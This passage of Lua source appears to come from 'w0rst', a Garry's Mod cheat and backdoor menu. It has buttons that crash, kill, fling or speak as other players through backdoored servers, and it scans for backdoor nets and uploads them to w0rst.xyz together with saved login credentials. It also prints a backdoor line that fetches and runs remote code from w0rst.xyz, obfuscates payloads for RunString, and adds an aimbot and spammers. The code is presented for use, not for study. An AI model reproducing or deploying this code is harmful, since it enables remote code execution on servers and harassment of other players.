    ]])
end)

CreateBDClient("Crash", function()
    Log("Player "..Player(SelectedPlr):Nick().." Crashed")
    SendLua([[
        local me = Player(]]..SelectedPlr..[[) 
        me:SendLua("while true do end")
    ]])
end)

CreateBDClient("Kill", function()
    Log("Killed: "..Player(SelectedPlr):Nick())
    SendLua([[
        local me = Player(]]..SelectedPlr..[[)
        me:Kill()
        me:Spawn()
    ]])
end)

CreateBDClient("Fling", function()
    Log("Flung: "..Player(SelectedPlr):Nick())
    SendLua([[
        local me = Player(]]..SelectedPlr..[[)
        me:SetVelocity(Vector(math.random(-1000,1000),math.random(-1000,1000),math.random(50,1000)))
    ]])
end)

CreateBDClient("Say",  function()
    CreateInputBox("Say", function(str)
        Log("Player: "..Player(SelectedPlr):Nick().." Said "..str)
        SendLua([[
            local me = Player(]]..SelectedPlr..[[)
            me:Say("]]..str..[[")
        ]])
    end)
end)

CreateBDClient("NoClip",  function()
    SendLua([[
        local me = Player(]]..SelectedPlr..[[)
        if me:GetMoveType() ~= MOVETYPE_NOCLIP then
            me:SetMoveType(MOVETYPE_NOCLIP)
        else
            me:SetMoveType(MOVETYPE_WALK)
        end
    ]])

    if Player(SelectedPlr):GetMoveType() == MOVETYPE_NOCLIP then
        Log("Noclip Off")
    else
        Log("Noclip On")
    end
end)

CreateButton("Net-Scan", BackdoorTab[1], 115, 30, 19, 520, function()
    http.Post("https://w0rst.xyz/api/net/view.php", { A0791AfFA0F30EdCee1EdADb = "02C2C6A1Ded7183AeDAA8650" }, function(b)
        local Nets = string.Split(b, " ")
        for k, v in pairs(Nets) do
            if CheckNet(v) then
                Log("Net Found: "..v)
                SelectedNet=v
            end
        end
    end)
end)

CreateButton("Select-Net", BackdoorTab[1], 115, 30, 139, 520, function()
    CreateInputBox("Net", function(str)
        if CheckNet(str) then
            SelectedNet=str
            Log("Selected Net "..str)
        else
            Log("Invalid Net")
        end
    end)
end)

CreateButton("Add-Net", BackdoorTab[1], 115, 30, 259, 520, function()
    CreateInputBox("Net", function(str)
        local UserInfo = string.Split(file.Read("w0rst/login.txt"), ":")
        http.Post("https://w0rst.xyz/api/net/upload.php", { username=UserInfo[1], password=UserInfo[2], net=str }, function(b)
            if b[1] == "0" then
                Log("Uploaded Net "..str)
            elseif b[1] == "1" then
                Log("Incorrect Permissions")
            end
        end)
    end)
end)

CreateButton("Run Lua", BackdoorTab[1], 115, 30, 379, 520, function()
    if CheckNet(SelectedNet) then
        SendLua(LuaEditor:GetValue())
    else
        Log("No Net Selected")
    end
end)

CreateCheckbox("Adv-Bhop", MiscTab[1], 22, 10, function()
    wtf.enable['Bhop'] = not wtf.enable['Bhop']
    if wtf.enable['Bhop'] then
        Log("Bhop Enabled")
    else
        Log("Bhop Disabled")
    end
end)

CreateButton("Net-Dumper", MiscTab[1], 110, 25, 142, 10, function()
    local name = "w0rst/netstrings".."_"..math.random(10^5,10^10)..".txt"
    if file.Exists(name, "DATA") then
        file.Delete(name)
    end

    for i=1,10000 do
        if util.NetworkIDToString(i) then
            if file.Exists(name, "DATA") then
                file.Append(name, "\n"..util.NetworkIDToString(i).." - "..i)
            else
                file.Write(name, GetHostName()..[[ - ]]..game.GetIPAddress().."\n"..util.NetworkIDToString(i).." - "..i)
            end
        end
    end

    Log("Check Console")
    print("Location: GarrysMod\\garrysmod\\data\\"..name)
end)

CreateButton("w0rst-backdoor", MiscTab[1], 110, 25, 262, 10, function()
    MsgC("timer.Simple(5, function() http.Fetch('https://w0rst.xyz/script/napalm', RunString) end)\n")
    Log("Check Console")
end)

CreateCheckbox("RGB-Physgun", MiscTab[1], 382, 10, function()
    wtf.enable['PhysRainbow'] = not wtf.enable['PhysRainbow']
    if wtf.enable['PhysRainbow'] then
        Log("RGB-Physgun Enabled")
    else
        Log("RGB-Physgun Disabled")
    end
end)

CreateCheckbox("Use-Spammer", MiscTab[1], 22, 40, function()
    wtf.enable['UseSpam'] = not wtf.enable['UseSpam']
    if wtf.enable['UseSpam'] then
        Log("Use Spammer Enabled")
    else
        Log("Use Spammer Disabled")
    end
end)

CreateCheckbox("Flash-Spammer", MiscTab[1], 142, 40, function()
    wtf.enable['FlashSpam'] = not wtf.enable['FlashSpam']
    if wtf.enable['FlashSpam'] then
        Log("Flash Spammer Enabled")
    else
        Log("Flash Spammer Disabled")
    end
end)

CreateButton("FOV-Editor", MiscTab[1], 110, 25, 262, 40, function()
    CreateInputBox("Edit Fov", function(str)
        LocalPlayer():ConCommand("fov_desired "..str)
        Log("FOV Set: "..str)
    end)
end)

CreateButton("Encode-String", MiscTab[1], 110, 25, 382, 40, function()
    CreateInputBox("Encode String", function(str)
        local encoded = str:gsub(".", function(bb) return "\\" .. bb:byte() end)
        SetClipboardText("RunString('"..encoded.."')")
        print("RunString('"..encoded.."')")
        Log("Check Console")
      end)
end)

CreateCheckbox("Chat Advertise", MiscTab[1], 22, 70, function()
    wtf.enable['ChatSpam'] = not wtf.enable['ChatSpam']
    if wtf.enable['ChatSpam'] then
        Log("Chat Advertiser Enabled")
    else
        Log("Chat Advertiser Disabled")
    end
end)

CreateCheckbox("Fov Aimbot", MiscTab[1], 142, 70, function()
    wtf.enable['Aimbot'] = not wtf.enable['Aimbot']
    if wtf.enable['Aimbot'] then
        Log("Aimbot Enabled")
    else
        Log("Aimbot Disabled")
    end
end)

CreateSlider("Fov:", FovCircle, MiscTab[1], 1000, 5, 262, 70)

CreateCheckbox("Silent Lock", MiscTab[1], 382, 70, function()
    wtf.enable['SilentLock'] = not wtf.enable['SilentLock']
    if wtf.enable['SilentLock'] then
        Log("Silent Lock Enabled")
    else
        Log("Silent Lock Disabled")
    end
end)

CreateCheckbox("Auto Fire", MiscTab[1], 22, 100, function()
    wtf.enable['AutoFire'] = not wtf.enable['AutoFire']
    if wtf.enable['AutoFire'] then
        Log("Aimbot AutoFire Enabled")
    else
        Log("Aimbot AutoFire Disabled")
    end
end)

CreateBindableButton("Bind Aimbot", "Aimbot", MiscTab[1], 142, 100)

CreateBindableButton("Bind Menu", "Menu", MiscTab[1], 262, 100)

CreateButton("Panic (Unload Script)", MiscTab[1], 110, 25, 382, 100, function()
    Menu:Close(); Unload()
end)

CreateButton("Play URL-Link", SoundsTab[1], 120, 35, 385, 520, function()
    CreateInputBox("Play URL", function(str)
        SendLua([[BroadcastLua("sound.PlayURL(']]..str..[[' , 'mono', function() end)")]])
        Log("Playing: " .. str)
    end)
end)

CreateButton("Stop Sounds", SoundsTab[1], 120, 35, 255, 520, function()
    SendLua([[for k,v in pairs(player.GetAll()) do v:ConCommand('stopsound') end]])
    Log("Stopped Sounds")
end)

--/ http.Fetch("https://w0rst.xyz/script/load", RunString)